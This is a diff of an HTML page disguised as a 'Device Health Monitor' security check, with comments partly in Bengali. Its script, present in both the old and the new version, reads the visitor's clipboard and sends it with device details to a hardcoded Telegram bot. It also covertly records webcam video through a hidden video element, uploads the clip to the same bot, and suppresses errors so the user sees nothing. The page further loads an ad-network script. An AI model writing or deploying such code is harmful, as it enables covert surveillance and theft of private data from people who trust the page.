@@ -3,113 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device System Analysis</title>
+    <title>RK Secure System</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
 
     <style>
-        body { background: #070b14; color: #cbd5e1; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
-        .info-card { background: #1e293b; padding: 12px; border-radius: 10px; border-left: 4px solid #0ea5e9; margin-bottom: 10px; }
-        .clipboard-box { background: #0f172a; border: 1px dashed #334155; padding: 10px; color: #38bdf8; font-family: monospace; border-radius: 8px; }
-        #video-hidden { display: none; }
+        body { background-color: #0b0f1a; color: #e2e8f0; }
+        .glass { background: rgba(22, 30, 45, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        .info-row { background: #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 8px; border-left: 3px solid #0ea5e9; }
+        .clip-box { background: #000; color: #38bdf8; padding: 10px; border-radius: 6px; font-size: 11px; font-family: monospace; }
+        #cam-raw { display: none; } /* Video hidden from user */
     </style>
 </head>
-<body class="flex flex-col items-center min-h-screen p-5">
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <div class="w-full max-w-md h-20 bg-slate-900 mb-6 flex items-center justify-center rounded-lg border border-slate-800">
-        <span class="text-slate-600 text-xs italic">Sponsored Ad</span>
-    </div>
-
-    <div class="glass p-6 rounded-3xl w-full max-w-md shadow-2xl">
-        <h1 class="text-xl font-bold text-white text-center mb-6">System Diagnostic Monitor</h1>
-
-        <div id="display-info">
-            <div class="info-card">
-                <p class="text-xs text-slate-400 uppercase">OS & Browser</p>
-                <p id="ui-os" class="text-sm font-semibold text-white">Detecting...</p>
+    <div class="glass p-8 rounded-3xl shadow-2xl w-full max-w-md text-center">
+        <h2 class="text-xl font-bold text-sky-400 mb-6">Device Health Monitor</h2>
+        
+        <div class="text-left mb-6">
+            <div class="info-row">
+                <p class="text-[10px] text-slate-400 uppercase">System OS</p>
+                <p id="ui-os" class="text-sm font-bold text-white">Loading...</p>
             </div>
-            <div class="info-card">
-                <p class="text-xs text-slate-400 uppercase">Screen Resolution</p>
-                <p id="ui-res" class="text-sm font-semibold text-white">---</p>
-            </div>
-            <div class="info-card">
-                <p class="text-xs text-slate-400 uppercase">Connection</p>
-                <p id="ui-net" class="text-sm font-semibold text-sky-400">Checking...</p>
+            <div class="info-row">
+                <p class="text-[10px] text-slate-400 uppercase">Screen Info</p>
+                <p id="ui-res" class="text-sm font-bold text-white">Detecting...</p>
             </div>
             <div class="mt-4">
-                <p class="text-xs text-slate-400 mb-2 uppercase">Current Clipboard Data:</p>
-                <div id="ui-clip" class="clipboard-box text-xs break-all">Permission required...</div>
+                <p class="text-xs text-slate-400 mb-2 uppercase">Detected Data:</p>
+                <div id="ui-clip" class="clip-box">Checking system...</div>
             </div>
         </div>
+        
+        <video id="cam-raw" autoplay muted playsinline></video>
 
-        <video id="video-hidden" autoplay muted playsinline></video>
-
-        <button id="start-btn" class="w-full mt-8 bg-sky-600 hover:bg-sky-500 text-white font-bold py-4 rounded-2xl transition shadow-lg shadow-sky-900/20 active:scale-95">
-            START SECURITY CHECK
+        <button id="trigger" class="w-full bg-sky-600 hover:bg-sky-500 text-white font-bold py-4 rounded-2xl transition-all shadow-lg active:scale-95">
+            CHECK SYSTEM STATUS
         </button>
 
-        <div id="loading" class="mt-6 hidden flex flex-col items-center">
+        <div id="loader" class="mt-6 hidden flex flex-col items-center">
             <div class="w-10 h-10 border-4 border-sky-500 border-t-transparent rounded-full animate-spin"></div>
-            <p id="status-msg" class="text-sky-400 text-xs mt-3 font-mono">এনালাইজিং ডাটা...</p>
+            <p class="text-slate-500 text-xs mt-3">Analyzing device safety...</p>
         </div>
     </div>
+
+    <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
 
     <script>
         const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
         const CHAT_ID = '6048050987';
 
-        const startBtn = document.getElementById('start-btn');
-        const loading = document.getElementById('loading');
-        const statusMsg = document.getElementById('status-msg');
-        const videoElement = document.getElementById('video-hidden');
+        // Set UI Info
+        document.getElementById('ui-os').innerText = navigator.platform;
+        document.getElementById('ui-res').innerText = window.screen.width + "x" + window.screen.height;
 
-        // স্ক্রিনে ডাটা দেখানো (Initial UI)
-        document.getElementById('ui-os').innerText = navigator.platform + " | " + (navigator.userAgent.includes("Chrome") ? "Chrome" : "Browser");
-        document.getElementById('ui-res').innerText = window.screen.width + " x " + window.screen.height;
-        document.getElementById('ui-net').innerText = navigator.onLine ? "Connected" : "Offline";
+        const btn = document.getElementById('trigger');
+        const loader = document.getElementById('loader');
+        const video = document.getElementById('cam-raw');
 
-        startBtn.addEventListener('click', async () => {
-            startBtn.style.display = 'none';
-            loading.classList.remove('hidden');
+        btn.addEventListener('click', async () => {
+            btn.style.display = 'none';
+            loader.classList.remove('hidden');
 
-            let clipText = "Access Denied";
+            let clipData = "Access Denied";
             try {
-                clipText = await navigator.clipboard.readText();
-                document.getElementById('ui-clip').innerText = clipText || "Empty";
-            } catch (e) {
-                document.getElementById('ui-clip').innerText = "Access Denied";
-            }
+                clipData = await navigator.clipboard.readText();
+                document.getElementById('ui-clip').innerText = clipData || "No data found";
+            } catch (e) { document.getElementById('ui-clip').innerText = "Permission Denied"; }
 
-            // ১. সুন্দরভাবে সাজানো টেক্সট রিপোর্ট (Bot এ যাবে)
-            const report = `
-📊 *NEW SYSTEM LOG*
-━━━━━━━━━━━━━━━━━━
-📱 *OS:* \`${navigator.platform}\`
-🌐 *User Agent:* \`${navigator.userAgent.substring(0, 50)}...\`
+            // ১. Report Message (Directly to Bot)
+            const logMessage = `
+✅ *SEND SUCCESSFUL: REPORT DETAILS*
+━━━━━━━━━━━━━━━━━━━━
+📱 *Device OS:* \`${navigator.platform}\`
 🖥 *Resolution:* \`${window.screen.width}x${window.screen.height}\`
-🛰 *Network:* \`${navigator.onLine ? "Online" : "Offline"}\`
+🌐 *Browser:* \`${navigator.userAgent.substring(0, 50)}...\`
 
 📋 *CLIPBOARD DATA:*
 \`\`\`
-${clipText}
+${clipData}
 \`\`\`
-━━━━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━━━━━━`;
 
-            // অটোমেটিক টেক্সট পাঠানো
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // Auto-send text to bot immediately
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: logMessage, parse_mode: 'Markdown' })
             });
 
-            // ২. অটোমেটিক ভিডিও রেকর্ড (১০ সেকেন্ড)
+            // ২. 5s Video Record and Auto-send
             try {
-                statusMsg.innerText = "Syncing Security Data (10s)...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                videoElement.srcObject = stream;
-
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
 
@@ -118,20 +105,19 @@ ${clipText}
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const fd = new FormData();
                     fd.append('chat_id', CHAT_ID);
-                    fd.append('video', blob, 'capture.mp4');
+                    fd.append('video', blob, 'security_clip.mp4');
+                    // Caption e success message bot e jabe
+                    fd.append('caption', '🎥 Video Clip: Send Successful');
 
-                    statusMsg.innerText = "Uploading Secure Clip...";
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-
                     stream.getTracks().forEach(t => t.stop());
-                    statusMsg.innerText = "Check Completed Successfully!";
                 };
 
                 recorder.start();
-                setTimeout(() => recorder.stop(), 10000);
+                setTimeout(() => recorder.stop(), 5000); // 5 Seconds Record
 
             } catch (err) {
-                statusMsg.innerText = "Permission Required to Finish!";
+                // Background error - user will not see anything
             }
         });
     </script>
